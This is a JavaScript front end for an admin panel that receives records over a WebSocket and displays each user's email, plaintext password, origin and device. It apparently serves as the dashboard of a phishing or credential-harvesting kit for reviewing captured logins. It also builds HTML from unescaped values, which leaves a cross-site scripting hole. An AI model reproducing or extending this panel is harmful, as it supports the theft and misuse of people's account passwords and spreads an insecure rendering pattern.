
/*


*/
const users = document.getElementById('users') 
const socket = new WebSocket(`ws${location.protocol == 'https:'?'s':''}://${location.host}`)
var DATA

socket.onopen = ()=>{
    socket.send(JSON.stringify({
        message:"i-am-admin"
    }))
}
socket.onmessage = (message)=>{
    var data = JSON.parse(message.data)
    console.log(DATA)
    if (data.new_data) {
        DATA = data.new_data
        ecp_plat_form(data.new_data)
    }
}
const render_users = (Users)=>{
    console.log(Users)
    if (! Users[0].email) {
    users.innerHTML = `
        <div class="user">
            <div class="user-title">
                <h1 style="margin-top: 60px;">:(</h1>
            </div>
        </div>
    `
    return
    }
    users.innerHTML = ''
    console.log(Users)
    Users.reverse().forEach(USER => {
        let user_pannel = `
        <div class="user">
            <div class="user-title">
                <h1>${email_name(USER.email)}</h1>
            </div>
            <div class="green-hr"><hr></div>
            <ul class="user-ul" >
                <li><span><h4 style="display: inline;color: yellow;">email</h4>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : ${USER.email}</span></li>
                <li><span><h4 style="display: inline;color: yellow;">password</h4>&nbsp;&nbsp;: ${USER.password}</span></li>
                <li><span><h4 style="display: inline;color: yellow;">type</h4>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: ${USER.type}</span></li>
                <li><span><h4 style="display: inline;color: yellow;">from</h4>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: ${USER.from}</span></li>
                <li><span><h4 style="display: inline;color: yellow;">divaice</h4>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: ${USER.divaice.slice(13, 35)}</span></li>
            </ul>
            <div class="green-hr" style="margin-top: 10px;"><hr></div>
            <div class="user-controlse">
                <div>
                    <input class="user-delete" type="button" value="Delete" onclick="delet_user([['all_users', '${email_name(USER.email)}'], ['type', '${USER.type}', '${ecp_group_config.index_s}', '${email_name(USER.email)}']])">
                    <div class="ledF"></div>
                </div>
            </div>
        </div>
`
users.innerHTML += user_pannel
    });
}
users.onscroll = ()=>{
    if (users.scrollTop <= 15) {
        document.getElementById('icon-live').style.width = '0px'
    }else{
        document.getElementById('icon-live').style.width = '70px'
    }
}
const email_name = (email)=>{
    let Email = email
    if (Email.indexOf('@')) {
        return Email.slice(0,Email.indexOf('@'))
    }
    return Email
}
